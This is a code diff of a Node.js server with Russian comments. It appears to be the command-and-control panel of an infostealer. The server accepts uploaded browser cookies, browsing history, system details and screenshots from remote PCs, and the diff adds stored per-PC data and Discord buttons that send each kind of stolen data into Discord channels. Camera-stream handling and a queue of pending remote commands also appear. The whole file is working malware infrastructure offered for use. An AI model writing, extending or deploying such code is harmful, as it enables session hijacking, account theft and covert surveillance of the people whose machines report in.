@@ -3,12 +3,7 @@ import express from "express";
 import { Client, GatewayIntentBits, ActionRowBuilder, ButtonBuilder, ButtonStyle, ChannelType } from "discord.js";
 import { WebSocketServer } from "ws";
 import http from "http";
-import { fileURLToPath } from "url";
-import { dirname } from "path";
 import crypto from "crypto";
-
-const __filename = fileURLToPath(import.meta.url);
-const __dirname = dirname(__filename);
 
 const app = express();
 app.use(express.json({ limit: "100mb" }));
@@ -25,12 +20,12 @@ const LOG_CHANNEL = "server-logs";
 const ONLINE_TIMEOUT = 3*60*1000;
 const PC_DISCORD_UPLOAD_INTERVAL = 60*1000;
 const CAMERA_DISCORD_UPLOAD_INTERVAL = 30*1000;
-const CATEGORY_MAX_CHILDREN = 50;
 const MAX_FILE_SIZE = 6*1024*1024;
 
 // ---------- Состояние ----------
 const onlinePCs = {};
 const pendingCommands = {};
+const pcData = {};  // хранение последних данных ПК
 const channelByPC = {};
 const channelByCam = {};
 const wsCameraClients = {};
@@ -58,7 +53,6 @@ async function logToDiscord(msg){
     }catch(e){ console.error("Ошибка логирования:",e); }
 }
 
-// ---------- Категории и каналы ----------
 async function getOrCreateCategory(guild,name){
     const gid = guild.id;
     if(!categoryCacheByGuild.has(gid)) categoryCacheByGuild.set(gid,{});
@@ -105,7 +99,6 @@ async function getOrCreateLogChannel(guild){
     return created;
 }
 
-// ---------- Кнопки ----------
 function createControlButtons(pcId){
     const safePcId = encodeURIComponent(pcId);
     return [new ActionRowBuilder().addComponents(
@@ -126,20 +119,76 @@ function safeStringify(obj,maxLen=MAX_FILE_SIZE){
 }
 
 // ---------- Обработка кнопок ----------
-bot.on("interactionCreate",async interaction=>{
-    if(!interaction.isButton()) return;
-    const [command,encodedPcId] = interaction.customId.split("|");
+bot.on("interactionCreate", async interaction => {
+    if (!interaction.isButton()) return;
+
+    const [command, encodedPcId] = interaction.customId.split("|");
     const pcId = decodeURIComponent(encodedPcId);
     const isOnline = onlinePCs[pcId] && (Date.now() - onlinePCs[pcId] < ONLINE_TIMEOUT);
+    const replyOptions = { ephemeral: true };
 
-    const replyOptions={ephemeral:true};
-    if(command==="check_online"){ replyOptions.content = isOnline ? `✅ ПК ${pcId} онлайн` : `❌ ПК ${pcId} оффлайн`; await interaction.reply(replyOptions); return; }
-    if(!isOnline){ replyOptions.content = `❌ ПК ${pcId} оффлайн`; await interaction.reply(replyOptions); return; }
+    if (command === "check_online") {
+        replyOptions.content = isOnline ? `✅ ПК ${pcId} онлайн` : `❌ ПК ${pcId} оффлайн`;
+        await interaction.reply(replyOptions);
+        return;
+    }
 
-    if(!pendingCommands[pcId]) pendingCommands[pcId] = [];
-    pendingCommands[pcId].push(command);
-    replyOptions.content = `✅ Команда "${command}" отправлена ПК ${pcId}`;
-    await interaction.reply(replyOptions);
+    if (!isOnline) {
+        replyOptions.content = `❌ ПК ${pcId} оффлайн`;
+        await interaction.reply(replyOptions);
+        return;
+    }
+
+    const guild = await bot.guilds.fetch(GUILD_ID);
+    const category = await getOrCreateCategory(guild, CATEGORY_BASE_PC);
+    const channelName = safeChannelName("pc", pcId);
+    const channel = channelByPC[pcId] ? await guild.channels.fetch(channelByPC[pcId]).catch(() => null) : null;
+    const finalChannel = channel || await getOrCreateTextChannel(guild, channelName, category.id);
+    channelByPC[pcId] = finalChannel.id;
+
+    try {
+        const files = [];
+        if (!pcData[pcId]) {
+            replyOptions.content = `⚠️ Нет данных для ПК ${pcId}`;
+            await interaction.reply(replyOptions);
+            return;
+        }
+
+        switch (command) {
+            case "get_cookies":
+                if (pcData[pcId].cookies) {
+                    files.push({ attachment: Buffer.from(safeStringify({cookies: pcData[pcId].cookies})), name: `${channelName}-cookies.json` });
+                }
+                break;
+            case "get_history":
+                if (pcData[pcId].history) {
+                    files.push({ attachment: Buffer.from(safeStringify({history: pcData[pcId].history})), name: `${channelName}-history.json` });
+                }
+                break;
+            case "get_system":
+                if (pcData[pcId].systemInfo) {
+                    files.push({ attachment: Buffer.from(safeStringify({systemInfo: pcData[pcId].systemInfo})), name: `${channelName}-system.json` });
+                }
+                break;
+            case "get_screenshot":
+                if (pcData[pcId].screenshot) {
+                    files.push({ attachment: Buffer.from(pcData[pcId].screenshot, "base64"), name: `${channelName}-screenshot.jpeg` });
+                }
+                break;
+        }
+
+        if (files.length) {
+            await finalChannel.send({ files });
+            replyOptions.content = `✅ Данные "${command}" отправлены для ПК ${pcId}`;
+        } else {
+            replyOptions.content = `⚠️ Нет данных для команды "${command}"`;
+        }
+        await interaction.reply(replyOptions);
+    } catch (err) {
+        console.error(err);
+        replyOptions.content = `❌ Ошибка при отправке данных: ${err.message}`;
+        await interaction.reply(replyOptions);
+    }
 });
 
 // ---------- Upload PC ----------
@@ -147,8 +196,8 @@ app.post("/upload-pc", async (req,res)=>{
     try{
         const { pcId, cookies, history, systemInfo, screenshot } = req.body;
         if(!pcId) return res.status(400).json({error:"pcId required"});
-        const isNewPc = !onlinePCs[pcId];
         onlinePCs[pcId] = Date.now();
+        pcData[pcId] = { cookies, history, systemInfo, screenshot }; // сохраняем данные
 
         const guild = await bot.guilds.fetch(GUILD_ID);
         const category = await getOrCreateCategory(guild,CATEGORY_BASE_PC);
@@ -176,7 +225,6 @@ app.post("/upload-pc", async (req,res)=>{
         if(files.length) messageOptions.files = files; else messageOptions.content = `🟢 ПК ${pcId} обновлён`;
         await finalChannel.send(messageOptions);
         if(files.length) pcFileLastSent[pcId] = now;
-        if(isNewPc) await logToDiscord(`🖥 Новый ПК зарегистрирован: ${pcId}`);
 
         res.json({success:true});
     }catch(e){ await logToDiscord(`❌ Ошибка upload-pc: ${e.message}`); res.status(500).json({error:e.message}); }
